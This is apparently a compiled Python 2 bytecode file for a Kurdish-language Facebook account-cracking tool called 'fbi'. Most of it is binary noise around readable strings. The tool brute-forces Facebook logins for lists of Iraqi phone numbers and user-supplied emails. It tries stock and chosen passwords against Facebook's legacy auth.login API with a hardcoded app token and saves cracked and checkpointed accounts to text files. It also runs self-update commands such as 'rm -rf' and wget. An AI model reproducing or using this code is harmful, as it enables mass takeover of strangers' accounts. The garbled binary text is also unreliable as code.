ó
ÿc           @   s   e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d Z e j d  e GHd GHe j d  e j d  e j d  e j d  d GHe j d  e j d  e j d  e j d	  e j d  e j d  d
 GHxJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qiWe j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÃWy d d l Z Wn e k
 r3e j d  n Xy d d l Z Wn e k
 rde j d  n Xy d d l Z Wn8 e k
 r¯e j d  e j d  e j d  n Xd d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m  Z  e! e  e j" d  e j    Z# e# j$ e   e# j% e j& j'   d d d@ g e# _( dA g e# _( d!   Z) d" Z* d#   Z+ d$   Z, d%   Z- d&   Z. d d' l/ m/ Z/ d(   Z0 d) Z1 e1 GHd* Z2 d+ Z3 d, Z4 x e4 d, k rÑe5 d-  Z6 e6 e2 k r¼e5 d.  Z7 e7 e3 k r§d/ e6 GHe j d0  d1 Z4 qÎd2 GHe j d  qLd3 GHe j d  qLWd4   Z8 e8   d  Z9 g  Z: g  a; g  a< g  Z= g  Z> g  Z? g  Z@ d5   ZA d6   ZB d7   ZC d8   ZD d9   ZE d:   Z d;   ZF d<   ZG d=   ZH d>   ZI eJ d? k re j d  e j d0  eA   n  d S(B   i    iÿÿÿÿNs+   [90mChawarwan Ba Ta Toolaka Update Abetawat   clears   [1;92m Update Abetawa i   s   rm - rf fbi.pys+   [1;91mTkaya Chawarwan Ba Update Abetawa ! s:   wget https://github.com/LoSt-SoFtware/fbi/blob/main/fbi.pys   [92mToolaka Update Bowai'  iGô i s   .txtt   as   rm -rf ..txti   iç  s   ..txts   pip2 install tqdms   pip2 install requestss   pip2 install mechanizes   python2 .py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   549738057o.pyt   mengetikC   s    sp   ---------------------------------------------
Xawane Am toola Lost ---------------------------------------------c           C   s   d GHt  j j   d  S(   Nt   Keluar(   t   osR   t   exit(    (    (    s   549738057o.pyt   keluarJ   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   549738057o.pyt   acakO   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   R   R	   (   R   R   R   t   jR   (    (    s   549738057o.pyR   X   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gü©ñÒMbP?(   R   R   R	   R
   R   R   (   R   R   (    (    s   549738057o.pyt   jalanc   s    (   t   tqdmc          C   sY   t  d d d d d d  8 }  x. t d  D]  } t j d  |  j d  q+ WWd  QXd  S(	   Nt   totalid   t   descs   Loading t
   bar_formats   {l_bar}{bar}g¸ëQ¸?i   (   R&   t   rangeR   R   t   update(   t   pbarR   (    (    s   549738057o.pyt   loadl   s    sá  [90m
8888888888 888888b.  8888888 
888        888  "88b   888   
888        888  .88P   888   
8888888    8888888K.   888   
888        888  "Y88b  888   
888        888    888  888   
888        888   d88P  888   
888        8888888P" 8888888 
---------------------------------------------------------------
[91m
Auther    : LOST

Github    : https://github.com/LoSt-SoFtware

YouTube   : LOST KURDISH

[90m
---------------------------------------------------------------[97m
t   lostt   fbit   trues   [1;90mUsername : s   [1;90mPassword : s   
[92mDaxlbuy Ba Username  i   t   falses   [1;90mWrong Passwords   [1;90mWrong Usernamec          C   sÒ   t  t j    t  t j    }  d j |   } d | GHye t j d  j } | | k r d GHt  t j    } t j	 d  n d GHt j	 d  t
 j   Wn, t
 j   t d k rÎ t GHt   qÎ n Xd  S(   Nt   -s   

[37;1mYour ID : s;   https://raw.githubusercontent.com/LoSt-SoFtware/fbi/main/Ids$   [92mYOUR ID IS ACTIVE.........[97mi   s(   [91mYOUR ID IS NOT ACTIVE.........[97mt   __main__(   R#   R   t   geteuidt   getlogint   joint   requestst   gett   textR   R   R   R   t   namet   logot   chk(   t   uuidt   idt   httpCahtt   msg(    (    s   549738057o.pyR<      s$    "	
c           C   s5   t  j d  t GHd GHd GHd GHd d GHt   d  S(   NR    s+   [90m[ 1 ] Crack Krdn Be Facebook Daxl Krdns7   [90m[ 2 ] Crack Krdn Ba Fb Daxl Krdn [92m(login)[97ms   [97m[ 0 ] Darchun Lam Toolai2   s   [1;97m~(   R   t   systemR;   t
   pilih_menu(    (    (    s   549738057o.pyt   menuº   s    	c          C   sÅ   t  d  }  |  d k r' d GHt   n |  d k s? |  d k rI t   nx |  d k sa |  d k rq t j d  nP |  d k s |  d k r t   n. |  d k s« |  d	 k rµ t   n d
 GHt   d  S(   Ns   [97mHalbzhera :R   s)   [1;97m[[1;91m![1;97m][1;97m Hallaya !t   1t   2s   python2 FB.pyt   9t   0t   00s#   [1;97m[[1;91mÃ·[1;97m] Hallaya !(   t	   raw_inputRB   t   crack_raqamR   RA   t   new_logoR   (   t   unikers(    (    s   549738057o.pyRB   Ä   s    



c           C   s?   t  j d  t GHd GHd GHd GHd GHd GHd d GHt   d  S(	   NR    s(   [90m[ 1 ] Crack Krdn Laregay Hamu Xateks4   [90m[ 2 ] Crack Krdn Ba Free Mode [92m(Be CP)[97ms&   [90m[ 3 ] Crack Krdn Ba Paswordi Xow s(   [90m[ 4 ] Crack Krdni Email Fb Lasarbe s   [97m[ 0 ] Darchun Lam Bashai2   s   [1;97m~(   R   RA   R;   t   pilih(    (    (    s   549738057o.pyRJ   Ö   s    	c          C   sá   t  d  }  |  d k r' d GHt   n¶ |  d k s? |  d k rI t   n |  d k sa |  d k rk t   nr |  d k s |  d k r t   nP |  d k s¥ |  d k r¯ t   n. |  d k sÇ |  d k rÑ t   n d	 GHt   d  S(
   Ns   [1;97mHalbzherra : R   s)   [1;97m[[1;91mx[1;97m][1;91m Hallaya !RD   RE   t   3t   4RG   s#   [1;97m[[1;91mÃ·[1;97m] Hallaya !(   RI   RM   t   kurdR.   t   softwaret   crack_emailRC   (   RL   (    (    s   549738057o.pyRM   ã   s     





c             s  t  j d  t GHd GHd d GHyq t d    t    d k  rM t d  n d d	  d
 }  x0 t |  d  j   D] } t j	 | j
    qs WWn' t k
 rº d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d GHt j d  d GH   f d   } t d  } | j | t  d d GHd GHd t t t   d t t t   GHd d GHt d  t  j d  d  S(   NR    sE   [90m770-771-772-773-774
 750-751-752-753-754
  780-781-782-783-784

i2   s   [1;97m~s   [1;97mHalbzherra : i   s6   [1;97m[[1;92m![1;97m][1;96m Kode Dabe 3 pit be  !!R   s   +964s   .txtt   rs   [!] File Not Founds	   
[ Back ]s   [1;97mKoy Raqamakan i   s   [1;97mTkaya Daymaxa ! s   [1;92mCrack Dasti Pekrd s3   [1;97m
===========================================c            s  |  } y t  j d  Wn t k
 r* n XyFd } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  nd | d k r\d    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  nd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  nad | d k rd    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  næd } t j d    | d | d  } t j |  } d | k r=d    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  n3d | d k r¸d    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  n¸d }	 t j d    | d |	 d  } t j |  } d | k rkd    | d |	 GHt d	 d
  } | j d    | d |	 d  | j	   t
 j | |	  nd | d k ræd    | d |	 GHt d	 d
  } | j d    | d |	 d  | j	   t j | |	  nd }
 t j d    | d |
 d  } t j |  } d | k rd    | d |
 GHt d	 d
  } | j d    | d |
 d  | j	   t
 j | |
  n×d | d k rd    | d |
 GHt d	 d
  } | j d    | d |
 d  | j	   t j | |
  n\d } t j d    | d | d  } t j |  } d | k rÇd    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  n©d | d k rBd    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  n.| } t j d    | d | d  } t j |  } d | k rõd    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  n{ d | d k rpd    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   Nt   outt   112233445566s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens"   [1;90m[[1;92mSuccessful[1;90m] s    [1;92m|[1;90m s   save/ind.txtR   s   [Berhasil] s    | s   
s   www.facebook.comt	   error_msgs"   [1;97m[[1;91mCheckpoint[1;97m] s    [1;91m|[1;97m s   [Cekpoint] t
   1122334455t
   1234512345t   123456123456t
   1234554321t   123456654321s"   [1;9pm[[1;92mSuccessful[1;9pm] s"   [1;9pm[[1;92mSuccessful[1;90m] (   R   t   mkdirt   OSErrort   urllibt   urlopent   jsonR-   t   openR	   t   closet   okst   appendt   cekpoint(   t   argt   usert   pass1t   dataR   t   okbt   cpst   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   ct   k(    s   549738057o.pyt   main  sâ    '%
%
'%
%
'%
%
'%
%
'%
%
'%
%
'%
%
i   s   [1;97mCrack Tawaws   [1;97mKoy Hack Buakan s   Koy Chekpointakans!   [1;97m[[1;92m Garanawa [1;97m]s   python2 parastn.py(   R   RA   R;   RI   R   R   Rb   t	   readlinesR>   Re   t   stript   IOErrorRC   R#   R%   R   R   R   t   mapRd   Rf   (   t   idlistt   linet   xxxRu   t   p(    (   Rs   Rt   s   549738057o.pyRP   ÷   s@    	"

z	)	
c             s  t  j d  t GHd GHd d GHyq t d    t    d k  rM t d  n d d	  d
 }  x0 t |  d  j   D] } t j	 | j
    qs WWn' t k
 rº d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d GHt j d  d GH   f d   } t d  } | j | t  d GHd GHd t t t   d GHd GHt d  t  j d  d  S(   NR    sE   [90m770-771-772-773-774
 750-751-752-753-754
  780-781-782-783-784

i2   s   [1;97m~s   [1;97mHalbzherra : i   s5   [1;97m[[1;92m![1;97m][1;91m Kode Dabe 3 pit be !!R   s   +964s   .txtRS   s   [!] File Not Founds   
[ Kembali ]s   [1;97mKoy Raqamakan g      à?s   [1;97mTkaya Daymaxa ! s   [1;92mCrack Daste Pekrdi   sG   [1;97m
===============================================================c   	         s|  |  } y t  j d  Wn t k
 r* n XyC| } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  nd | d k rCt d d	  } | j d    | d | d  | j	   t j | |  n*d } t j d    | d | d  } t j |  } d | k röd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  nwd | d k rXt d d	  } | j d    | d | d  | j	   t j | |  nd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  nb d | d k rmt d d	  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   s"   [1;90m[[1;92mSuccessful[1;90m] s    [1;92m|[1;90m s   save/bangla1.txtR   s   [Berhasil] s    | s   
s   www.facebook.comRW   s   [Cekpoint] s    â RX   t	   123454321(   R   R]   R^   R_   R`   Ra   R-   Rb   R	   Rc   Rd   Re   Rf   (	   Rg   Rh   Ri   Rj   R   Rk   Rl   Rm   Rn   (   Rs   Rt   (    s   549738057o.pyRu   ¶  sd    '%
%
'%
%
'%
%
i   s9   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s5   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Tawaw Bu ....s   [92mKoy Hackbus   [1;97m-x1b[1;97ms!   [1;97m[[1;92m Garanawa [1;97m]s   python2 parastn.py(   R   RA   R;   RI   R   R   Rb   Rv   R>   Re   Rw   Rx   RC   R#   R%   R   R   R   Ry   Rd   (   Rz   R{   R|   Ru   R}   (    (   Rs   Rt   s   549738057o.pyR.     s@    	"

:
c             sç  t  j d  t GHd GHd d GHy² t d    t    d k  rM t d  n d d	  d
 GHt d   t d   t d   t d   t d   d }  x0 t |  d  j   D] } t j	 | j
    q´ WWn' t k
 rû d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d GHt j d  d GH        f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHt d   t  j d!  d  S("   NR    s   [1;97m770-771-750-751-780-781i2   s   [1;97m~s   [1;97mHalbzherra : i   s5   [1;97m[[1;92m![1;97m][1;96m Kode Dabe 3 Pit be !!R   s   +964s   [1;90mNmuna : 1122334455s   [90mPaswordi 1 Kam  : s   [90mPaswordi 2 Wam : s   [90mPaswordi 3 Yam  : s   [90mPaswordi 4 Am    :s   [90mPaswordi 5 Am    :[97ms   .txtRS   s   [!] File Not Founds   
[ Kembali ]s   [1;97mKoy Raqamakan g      à?s   [1;97mTkaya Daymaxa ! s   [1;92mCrack Dasti Pekrd i   s:   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÌt j d    | d  d  } t j |  } d | k rÛ d    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nd | d k rVd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n t j d    | d  d  } t j |  } d | k rd    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nód | d k r~d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nxt j d    | d  d  } t j |  } d | k r+d    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   nËd | d k r¦d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nPt j d    | d  d  } t j |  } d | k rSd    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n£d | d k rÎd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n(t j d    | d  d  } t j |  } d | k r{d    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n{ d | d k röd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n  Wn n Xd  S(   NR~   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   s"   [1;90m[[1;92mSuccessful[1;90m] s    [1;92m|[1;90m s   save/nguyen.txtR   s   [Successful] s    | s   
s   www.facebook.comRW   s"   [1;97m[[1;91mCheckpoint[1;97m] s    [1;91m|[1;97m s   [Checkpoint] s   [Successful]s   [Checkpoint]s   [Checkpoint(   R   R]   R^   R_   R`   Ra   R-   Rb   R	   Rc   Rd   Re   Rf   (   Rg   Rh   Rj   R   Rk   Rl   (   Rs   Rt   Ri   Rm   Rn   Ro   Rp   (    s   549738057o.pyRu     s    '%
%
'%
%
'%
%
'%
%
'%
%
i   s9   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s/   [1;97m[[1;92m[1;97m] [1;97mCrack Tawaw ....sN   [1;97m[[1;92m[1;97m] [1;97mKoy [1;92mOK[1;97m/[1;91mCP [1;97m: [1;92ms   [1;97m/[1;93ms!   [1;97m[[1;92m Garanawa [1;97m]s   python2 parastn.py(   R   RA   R;   RI   R   R   Rb   Rv   R>   Re   Rw   Rx   RC   R#   R%   R   R   R   Ry   Rd   Rf   (   Rz   R{   R|   Ru   R}   (    (   Rs   Rt   Ri   Rm   Rn   Ro   Rp   s   549738057o.pyRQ   ú  sL    	"

!U)
c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   R   R   R   (    (    (    s   549738057o.pyt	   new_raqamy  s    c             sº  t  j d  t GHy t d    d GHt d   d GHt d   t d   t d   t d	   t d
   d }  x0 t |  d  j   D] } t j | j    q WWn' t	 k
 rÖ d GHt d  t
   n Xt t t   } t d |  t j d  t d  t j d  d GHd GH        f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d  d  S(   NR    s   [1;97mNawek Bnusa : s   [1;97m Nmuna (@gmail.com)s   [1;97mEmailek Bnusa : s+   [1;97mPaswordakan Bnusa Nmuna : 1122334455s   [1;97mPasswordi 1 Kam  : s   [1;97mPasswordi 2 Wam : s   [1;97mPasswordi 3 Yam  : s   [1;97mPasswordi 4 Am    : s   [1;97mPasswordi 5 Am    : s   ..txtRS   s   [!] File Not Founds   
[ Kembali ]s   [1;97mHamu Emailakan i   s   [1;97mTkaya Daymaxa ! s   [1;92mCrack Daste Pekrd s:   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÍt j d   |  d  d  } t j |  } d | k rÛ d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nd | d k rVd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n¡t j d   |  d  d  } t j |  } d | k rd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nôd | d k r~d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nyt j d   |  d  d  } t j |  } d | k r+d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nÌd | d k r¦d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nQt j d   |  d  d  } t j |  } d | k rSd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   n¤d | d k rÎd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n)t j d   |  d  d  } t j |  } d | k r{d   |  d  GHt d d	  } | j d   |  d  d  | j	   t
 j |   n| d | d k r÷d   |  d  GH| j d d	  | j d   |  d  d  | j	   t j |   n  Wn n Xd  S(   NR~   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   s"   [1;97m[[1;92mSuccessful[1;97m] s    [1;92m|[1;97m s   save/email.txtR   s   [Berhasil] s    | s   
s   www.facebook.comRW   s"   [1;97m[[1;91mCheckpoint[1;97m] s    [1;91m|[1;97m s   [Cekpoint] s
   [Berhasil]s
   [Cekpoint](   R   R]   R^   R_   R`   Ra   R-   Rb   R	   Rc   Rd   Re   Rf   (   Rg   Rh   Rj   R   Rk   Rl   (   Rs   Rt   Ri   Rm   Rn   Ro   Rp   (    s   549738057o.pyRu     s    '%
%
'%
%
'%
%
'%
%
'%
%
i   s1   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s2   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Tawaw ....sS   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms>   [1;97m[[1;92mâ¢[1;97m] [1;97mCP/OK Hamuy : save/email.txts1   [1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s   [1;97m[[1;92m BACK [1;97m]s   python2 parastn.py(   R   RA   R;   RI   Rb   Rv   R>   Re   Rw   Rx   RC   R#   R   R%   R   R   R   Ry   Rd   Rf   (   Rz   R{   R|   Ru   R}   (    (   Rs   Rt   Ri   Rm   Rn   Ro   Rp   s   549738057o.pyRR   }  sH    

!U)
c          C   s$   t  d  }  t j d  t   d  S(   Ns   [1;97mNawe Xot Bnusa  : R    (   RI   R   RA   RC   (   t   n(    (    s   549738057o.pyRK   ú  s    R3   (   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](K   t   Falset   foot   barR   R   R   t   datetimeR   t   hashlibt   ret	   threadingRa   R_   t	   cookielibt   getpassR}   RA   R   R*   R   R   R.   Rb   R   R
   R7   t   ImportErrort	   mechanizet   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   RS   R   R    R   R%   R&   R-   R;   t   CorrectUsernamet   CorrectPasswordt   loopRI   t   usernamet   passwordR<   t   backt   berhasilRf   Rd   Rk   R>   t   cpbRl   RC   RB   RJ   RM   RP   RQ   R   RR   RK   t   __name__(    (    (    s   549738057o.pyt   <module>   sÒ   

											
				£	`			}	